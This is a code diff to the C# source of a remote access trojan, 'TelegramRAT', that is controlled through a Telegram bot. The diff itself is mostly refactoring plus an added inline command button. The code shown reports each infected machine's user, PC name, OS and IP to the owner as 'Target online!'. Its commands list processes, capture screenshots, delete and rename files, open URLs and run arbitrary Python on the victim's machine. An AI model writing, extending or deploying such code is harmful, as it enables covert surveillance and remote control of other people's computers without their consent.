@@ -21,6 +21,7 @@ using Microsoft.Scripting.Hosting;
 using Microsoft.Win32;
 using AForge.Video.DirectShow;
 using CommandPrompt = Telegram.Bot.Types.BotCommand;
+using Telegram.Bot.Types.ReplyMarkups;
 
 
 namespace TelegramRAT
@@ -53,15 +54,15 @@ namespace TelegramRAT
             }
 
             Bot = new TelegramBotClient(BotToken);
-
+            
             PythonRuntime = Python.CreateRuntime();
             PythonEngine = Python.CreateEngine();
             PythonScope = PythonRuntime.CreateScope();
-
+            Run();
             //InitializeCommands(Commands);
             try
             {
-                Run();
+               
             }
             catch (Exception ex)
             {
@@ -80,7 +81,7 @@ namespace TelegramRAT
 
         }
 
-        static async void ReportError(Message message, Exception exception)
+        static async void ReportException(Message message, Exception exception)
         {
 #if DEBUG
             await Bot.SendTextMessageAsync(message.Chat.Id, "Error: \"" + exception.Message + "\" at \"" + exception.StackTrace + "\"", replyToMessageId: message.MessageId);
@@ -91,6 +92,9 @@ namespace TelegramRAT
 
         static void Run()
         {
+            InlineKeyboardMarkup markup = new(new InlineKeyboardButton[] {"Show All Commands"});
+            ReplyKeyboardRemove remove = new();
+
             var targetOnlineMessageTask = Bot.SendTextMessageAsync(OwnerId,
                 $"Target online! \n\n" +
 
@@ -98,7 +102,8 @@ namespace TelegramRAT
                 $"PC name: <b>{Environment.MachineName}</b>\n" +
                 $"OS: {Utils.GetWindowsVersion()}\n\n" +
                 $"IP: {Utils.GetIpAddressAsync().Result}",
-                ParseMode.Html);
+                ParseMode.Html,
+                replyMarkup: markup);
             var initCommandsTask = Task.Run(() => InitializeCommands(Commands));
 
             int offset = 0;
@@ -109,10 +114,7 @@ namespace TelegramRAT
                 if (updates.Length != 0)
                     offset = updates.Last().Id + 1;
 
-                updates = updates.Where(update =>
-                {
-                    return update.Message != null && update.Message.Date > targetOnlineMessageTask.Result.Date;
-                }).ToArray();
+                
                 initCommandsTask.Wait();
                 _ = UpdateWorker(updates);
 
@@ -125,6 +127,22 @@ namespace TelegramRAT
 
             foreach (var update in Updates)
             {
+
+                if (update.CallbackQuery != null)
+                {
+                    
+                    var callbackQuery = update.CallbackQuery;
+                    var inlineId = callbackQuery.Id;
+                    await Bot.AnswerCallbackQueryAsync(inlineId, text: "callback says hi");
+                    await Bot.EditMessageReplyMarkupAsync(callbackQuery.Message.Chat.Id, callbackQuery.Message.MessageId);
+                    if (callbackQuery.Data == "Show All Commands")
+                    {
+                        Commands.Find(cmd => cmd.Command == "commands").Execute.Invoke(new BotCommandModel{
+                            Message = callbackQuery.Message
+                        });
+                    }
+                    continue;
+                }
 
                 var model = BotCommandModel.FromMessage(update.Message, string.Empty);
 
@@ -171,7 +189,7 @@ namespace TelegramRAT
 
                 Execute = async model =>
                 {
-                    CommandPrompt[] botCommands = new CommandPrompt[]
+                    CommandPrompt[] botCommands = new []
                     {
                         new CommandPrompt
                         {
@@ -297,7 +315,7 @@ namespace TelegramRAT
                     }
                     catch (Exception ex)
                     {
-                        ReportError(model.Message, ex);
+                        ReportException(model.Message, ex);
                     }
                 }
 
@@ -367,7 +385,7 @@ namespace TelegramRAT
                     }
                     catch (Exception ex)
                     {
-                        ReportError(model.Message, ex);
+                        ReportException(model.Message, ex);
                     }
                 }
             });
@@ -376,7 +394,7 @@ namespace TelegramRAT
             CommandsList.Add(new BotCommand
             {
                 Command = "processes",
-                Aliases = new string[] { "prcss" },
+                Aliases = new[] { "prcss" },
                 ArgsCount = 0,
                 Description = "Get list of running processes.",
                 Example = "/processes",
@@ -404,7 +422,7 @@ namespace TelegramRAT
                     }
                     catch (Exception ex)
                     {
-                        ReportError(model.Message, ex);
+                        ReportException(model.Message, ex);
                     }
                 }
             });
@@ -413,7 +431,7 @@ namespace TelegramRAT
             CommandsList.Add(new BotCommand
             {
                 Command = "process",
-                Aliases = new string[] { "proc" },
+                Aliases = new[] { "proc" },
                 ArgsCount = 1,
 
                 Description = "Show info about process by its id.",
@@ -446,7 +464,7 @@ namespace TelegramRAT
                     }
                     catch (Exception ex)
                     {
-                        ReportError(model.Message, ex);
+                        ReportException(model.Message, ex);
                     }
                 }
             });
@@ -514,7 +532,7 @@ namespace TelegramRAT
                     }
                     catch (Exception ex)
                     {
-                        ReportError(model.Message, ex);
+                        ReportException(model.Message, ex);
                     }
                 }
             });
@@ -538,7 +556,7 @@ namespace TelegramRAT
                     }
                     catch (Exception ex)
                     {
-                        ReportError(model.Message, ex);
+                        ReportException(model.Message, ex);
                     }
                 }
             });
@@ -559,7 +577,7 @@ namespace TelegramRAT
                     }
                     catch (Exception ex)
                     {
-                        ReportError(model.Message, ex);
+                        ReportException(model.Message, ex);
                     }
                 }
             });
@@ -615,7 +633,7 @@ namespace TelegramRAT
                     }
                     catch (Exception ex)
                     {
-                        ReportError(model.Message, ex);
+                        ReportException(model.Message, ex);
                     }
                 }
             });
@@ -644,7 +662,7 @@ namespace TelegramRAT
                     }
                     catch (Exception ex)
                     {
-                        ReportError(model.Message, ex);
+                        ReportException(model.Message, ex);
                     }
                 }
             });
@@ -653,7 +671,7 @@ namespace TelegramRAT
             CommandsList.Add(new BotCommand
             {
                 Command = "screenshot",
-                Aliases = new string[] { "screen" },
+                Aliases = new[] { "screen" },
                 ArgsCount = 0,
                 Description = "Take a screenshot of all displays area.",
                 Example = "/screenshot",
@@ -679,7 +697,7 @@ namespace TelegramRAT
                     }
                     catch (Exception ex)
                     {
-                        ReportError(model.Message, ex);
+                        ReportException(model.Message, ex);
                     }
                 }
             });
@@ -748,7 +766,7 @@ namespace TelegramRAT
                         }
                         catch (Exception ex)
                         {
-                            ReportError(model.Message, ex);
+                            ReportException(model.Message, ex);
                         }
                     });
                 }
@@ -759,7 +777,7 @@ namespace TelegramRAT
             CommandsList.Add(new BotCommand
             {
                 Command = "message",
-                Aliases = new string[] { "msg" },
+                Aliases = new[] { "msg" },
                 ArgsCount = -2,
                 Description = "Send message with dialog window.",
                 Example = "message Lorem ipsum",
@@ -776,7 +794,7 @@ namespace TelegramRAT
                     }
                     catch (Exception ex)
                     {
-                        ReportError(model.Message, ex);
+                        ReportException(model.Message, ex);
                     }
                 }
 
@@ -786,7 +804,7 @@ namespace TelegramRAT
             CommandsList.Add(new BotCommand
             {
                 Command = "openurl",
-                Aliases = new string[] { "url" },
+                Aliases = new[] { "url" },
                 ArgsCount = -2,
                 Description = "Open URL with default browser.",
                 Example = "/openurl google.com",
@@ -837,7 +855,7 @@ namespace TelegramRAT
                     }
                     catch (Exception ex)
                     {
-                        ReportError(model.Message, ex);
+                        ReportException(model.Message, ex);
                     }
                 }
             });
@@ -886,7 +904,7 @@ namespace TelegramRAT
                        }
                        catch (Exception ex)
                        {
-                           ReportError(model.Message, ex);
+                           ReportException(model.Message, ex);
                        }
                    });
                },
@@ -898,7 +916,7 @@ namespace TelegramRAT
             CommandsList.Add(new BotCommand
             {
                 Command = "wallpaper",
-                Aliases = new string[] { "wllppr" },
+                Aliases = new[] { "wllppr" },
                 ArgsCount = 0,
                 Description = "Change wallpapers. Don't foreget to attach the image.",
                 Execute = async model =>
@@ -922,7 +940,7 @@ namespace TelegramRAT
                     }
                     catch (Exception ex)
                     {
-                        ReportError(model.Message, ex);
+                        ReportException(model.Message, ex);
                     }
                 }
             });
@@ -1056,7 +1074,7 @@ namespace TelegramRAT
                         }
                         catch (Exception ex)
                         {
-                            ReportError(model.Message, ex);
+                            ReportException(model.Message, ex);
                         }
                     });
                 }
@@ -1275,7 +1293,7 @@ namespace TelegramRAT
                     }
                     catch (Exception ex)
                     {
-                        ReportError(model.Message, ex);
+                        ReportException(model.Message, ex);
                     }
                 }
             });
@@ -1296,7 +1314,7 @@ namespace TelegramRAT
                     }
                     catch (Exception ex)
                     {
-                        ReportError(model.Message, ex);
+                        ReportException(model.Message, ex);
                     }
                 }
             });
@@ -1363,7 +1381,7 @@ namespace TelegramRAT
                         }
                         catch (Exception ex)
                         {
-                            ReportError(model.Message, ex);
+                            ReportException(model.Message, ex);
                         }
                     });
                 }
@@ -1428,7 +1446,7 @@ namespace TelegramRAT
                         }
                         catch (Exception ex)
                         {
-                            ReportError(model.Message, ex);
+                            ReportException(model.Message, ex);
                         }
 
                     });
@@ -1458,7 +1476,7 @@ namespace TelegramRAT
             CommandsList.Add(new BotCommand
             {
                 Command = "delete",
-                Aliases = new string[] { "del" },
+                Aliases = new[] { "del" },
                 Description = "Delete file in path",
                 Example = "/delete hello world.txt",
                 ArgsCount = -2,
@@ -1478,7 +1496,7 @@ namespace TelegramRAT
                     }
                     catch (Exception e)
                     {
-                        ReportError(model.Message, e);
+                        ReportException(model.Message, e);
                     }
 
                 }
@@ -1488,7 +1506,7 @@ namespace TelegramRAT
             CommandsList.Add(new BotCommand
             {
                 Command = "mkdir",
-                Aliases = new string[] { "md" },
+                Aliases = new[] { "md", "createfolder", "makedir", "createdir" },
                 Description = "Create directory.",
                 Example = "/mkdir C:\\Users\\User\\Documents\\NewFolder",
                 ArgsCount = -2,
@@ -1509,7 +1527,7 @@ namespace TelegramRAT
                     }
                     catch (Exception e)
                     {
-                        ReportError(model.Message, e);
+                        ReportException(model.Message, e);
                     }
                 }
             });
@@ -1536,7 +1554,7 @@ namespace TelegramRAT
                     }
                     catch (Exception e)
                     {
-                        ReportError(model.Message, e);
+                        ReportException(model.Message, e);
                     }
                 }
             });
@@ -1545,7 +1563,7 @@ namespace TelegramRAT
             CommandsList.Add(new BotCommand
             {
                 Command = "rename",
-                Aliases = new string[] { "ren" },
+                Aliases = new[] { "ren" },
 
                 ArgsCount = 2,
                 Description = "Rename file. First argument must be path (full or relative) for file. Second argument must contain only new name.",
@@ -1571,7 +1589,7 @@ namespace TelegramRAT
                     }
                     catch (Exception ex)
                     {
-                        ReportError(model.Message, ex);
+                        ReportException(model.Message, ex);
                     }
                 }
             });
@@ -1601,7 +1619,7 @@ namespace TelegramRAT
                     }
                     catch (Exception ex)
                     {
-                        ReportError(model.Message, ex);
+                        ReportException(model.Message, ex);
                     }
                 }
             });
@@ -1610,7 +1628,7 @@ namespace TelegramRAT
             CommandsList.Add(new BotCommand
             {
                 Command = "py",
-                Aliases = new string[] { "python" },
+                Aliases = new[] { "python" },
                 Description = "Execute python expression or file. To execute file attach it to message or send it and reply to it with command /py. Mind that all expressions and files execute in the same script scope. To clear scope /pyclearscope",
                 Example = "/py print('Hello World')",
                 Execute = async model =>
@@ -1678,7 +1696,7 @@ namespace TelegramRAT
                         }
                         catch (Exception ex)
                         {
-                            ReportError(model.Message, ex);
+                            ReportException(model.Message, ex);
                         }
 
                     });
@@ -1731,7 +1749,7 @@ namespace TelegramRAT
                     }
                     catch (Exception ex)
                     {
-                        ReportError(model.Message, ex);
+                        ReportException(model.Message, ex);
                     }
                 }
             });
@@ -1771,7 +1789,7 @@ namespace TelegramRAT
                     }
                     catch (Exception ex)
                     {
-                        ReportError(model.Message, ex);
+                        ReportException(model.Message, ex);
                     }
                 }
             });
@@ -1794,10 +1812,10 @@ namespace TelegramRAT
             });
 
             //REPEAT
-            CommandsList.Add(new BotCommand
+            CommandsList.Add(new ()
             {
                 Command = "repeat",
-                Aliases = new string[] { "rr", "rpt" },
+                Aliases = new[] { "rr", "rpt" },
 
                 Description = "Repeat command by replying to a message",
                 ArgsCount = 0,
@@ -1864,7 +1882,7 @@ namespace TelegramRAT
                     }
                     catch (Exception ex)
                     {
-                        ReportError(model.Message, ex);
+                        ReportException(model.Message, ex);
                     }
                 }
             });
@@ -1898,7 +1916,7 @@ namespace TelegramRAT
                         }
                         catch (Exception ex)
                         {
-                            ReportError(model.Message, ex);
+                            ReportException(model.Message, ex);
                         }
                     });
                 }
